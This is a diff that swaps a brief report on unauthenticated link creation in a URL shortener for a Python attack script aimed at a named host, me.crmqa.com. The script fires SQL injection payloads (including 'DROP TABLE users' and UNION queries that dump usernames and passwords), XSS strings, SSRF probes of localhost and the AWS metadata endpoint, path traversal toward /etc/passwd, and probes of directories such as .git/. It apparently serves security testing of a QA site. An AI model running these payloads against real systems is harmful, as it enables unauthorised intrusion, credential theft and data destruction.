@@ -1,26 +1,144 @@
-Title:
-Unauthenticated URL Generation in SmallURL Service
+import requests
+import urllib.parse
 
-Description:
-The SmallURL application currently allows anyone to generate shortened links without requiring authentication. For example:
+# Base URL for the shortening service
+BASE_URL = "https://me.crmqa.com/addurl.jsp"
 
-https://smallurl.crm.com/newurl=https://google.com
+# Base domain for directory listing tests
+DOMAIN = "https://me.crmqa.com/"
 
-This request succeeds even when the user is not logged in, resulting in a valid shortened URL.
+# Function to send a request with a given payload as the 'url' parameter
+def send_request(payload):
+    params = {'url': payload}
+    try:
+        response = requests.get(BASE_URL, params=params, timeout=10)
+        print(f"Payload: {payload}")
+        print(f"Status Code: {response.status_code}")
+        print(f"Response Headers: {response.headers}")
+        print(f"Response Content (truncated): {response.text[:500]}...")  # Truncate for brevity
+        print("\n---\n")
+        return response
+    except Exception as e:
+        print(f"Error with payload '{payload}': {e}\n---\n")
 
-Security impact:
+# Function to test directory listing on the domain
+def test_directory(dir_path):
+    url = DOMAIN + dir_path
+    try:
+        response = requests.get(url, timeout=10)
+        print(f"Directory: {dir_path}")
+        print(f"URL: {url}")
+        print(f"Status Code: {response.status_code}")
+        print(f"Response Headers: {response.headers}")
+        print(f"Response Content (truncated): {response.text[:500]}...")  # Truncate for brevity
+        # Check for signs of directory listing
+        if "Index of" in response.text or any(tag in response.text.lower() for tag in ["<a href=\"?C=N;O=D\">Name</a>", "<pre>", "parent directory"]):
+            print("Potential directory listing vulnerability detected!")
+        else:
+            print("No obvious directory listing.")
+        print("\n---\n")
+        return response
+    except Exception as e:
+        print(f"Error with directory '{dir_path}': {e}\n---\n")
 
-Attackers can mass-generate malicious short links using the company’s domain.
+# Normal request for baseline
+normal_payload = "https://google.com"
+send_request(normal_payload)
 
-Increases risk of phishing, spam, and reputation damage.
+# 1. Test for SQL Injection
+# Try classic SQLi payloads. Look for SQL error messages in response or unexpected behavior.
+sql_payloads = [
+    "https://google.com' OR '1'='1",
+    "https://google.com' OR '1'='2",
+    "https://google.com'; DROP TABLE users; --",
+    "https://google.com' UNION SELECT 1,2,3 --",
+    "https://google.com\" OR \"\"=\"\"",
+]
+print("Testing SQL Injection...")
+for payload in sql_payloads:
+    send_request(payload)
 
-No accountability since link creation is not tied to an authenticated user.
+# For blind SQLi, compare responses for true/false conditions
+# Assuming the service returns something different if condition is true
+true_sql = "https://google.com' AND '1'='1"
+false_sql = "https://google.com' AND '1'='2"
+print("Blind SQLi Test:")
+true_resp = send_request(true_sql)
+false_resp = send_request(false_sql)
+if true_resp.text == false_resp.text:
+    print("Responses are the same - possibly not vulnerable to blind SQLi")
+else:
+    print("Responses differ - potential blind SQLi vulnerability")
 
+# To test for table listing (e.g., extracting DB info via blind SQLi or error-based)
+# This is basic; for full extraction, use tools like sqlmap, but here's a simple check
+# Example: Try to union select from information_schema.tables
+table_list_payload = "https://google.com' UNION SELECT table_name FROM information_schema.tables --"
+send_request(table_list_payload)
 
-Recommendation:
+# For DB table data listing: Similar to SQLi, try dumping data.
+# Example: Union select to dump users
+data_list_payload = "https://google.com' UNION SELECT username,password FROM users --"
+send_request(data_list_payload)
 
-Enforce authentication before allowing URL creation.
+# 2. Test for XSS (Reflected)
+# Inject XSS payloads. If the response includes the payload unescaped in HTML/JS context, it's vulnerable.
+# User should check if <script>alert(1)</script> executes in browser, but here we check if it's in response.
+xss_payloads = [
+    'https://google.com"><script>alert(1)</script>',
+    "https://google.com' onclick='alert(1)",
+    'https://google.com"><img src=x onerror=alert(1)>',
+    urllib.parse.quote('https://google.com"><script>alert(1)</script>'),  # URL-encoded
+]
+print("Testing XSS...")
+for payload in xss_payloads:
+    resp = send_request(payload)
+    if '<script>alert(1)</script>' in resp.text or 'onerror=alert(1)' in resp.text:
+        print("Potential XSS: Payload reflected without escaping!")
 
-Implement rate limiting to prevent automated abuse.
+# 3. Test for SSRF
+# Try internal URLs. If the service fetches the URL, look for delays, errors, or echoed content.
+# Hard to confirm externally, but if it returns content from internal, or times out on invalid ports.
+ssrf_payloads = [
+    "http://127.0.0.1/",
+    "http://localhost/admin",
+    "http://169.254.169.254/latest/meta-data/",  # AWS metadata
+    "http://127.0.0.1:8080/",  # Common internal port
+    "file:///etc/passwd",  # File disclosure if vulnerable
+]
+print("Testing SSRF...")
+for payload in ssrf_payloads:
+    send_request(payload)
 
-Log creator details (user ID, IP) for audit and monitoring.
+# 4. Test for Directory/Table Listing
+# For directory listing: Try path traversal in URL param.
+# Assuming if it interprets URL as path somehow.
+dir_payloads = [
+    "https://google.com/../../etc/passwd",
+    "https://google.com/%2e%2e/%2e%2e/etc/passwd",
+]
+print("Testing Path Traversal via URL Param...")
+for payload in dir_payloads:
+    resp = send_request(payload)
+    if "root:" in resp.text or "bin:" in resp.text:  # Signs of /etc/passwd
+        print("Potential file disclosure!")
+
+# Additional: Test for Open Directory Listing on the Domain
+# Try accessing common directories and check for listing
+common_dirs = [
+    "",  # root directory
+    "admin/",
+    "images/",
+    "css/",
+    "js/",
+    "uploads/",
+    "backup/",
+    "test/",
+    "tmp/",
+    ".git/",  # If exposed
+]
+print("Testing Open Directory Listing on Domain...")
+for dir_path in common_dirs:
+    test_directory(dir_path)
+
+print("Tests completed. Inspect responses for signs of vulnerabilities. For XSS, test in browser. For SSRF, check server logs. Use tools like Burp/ZAP for deeper analysis.")
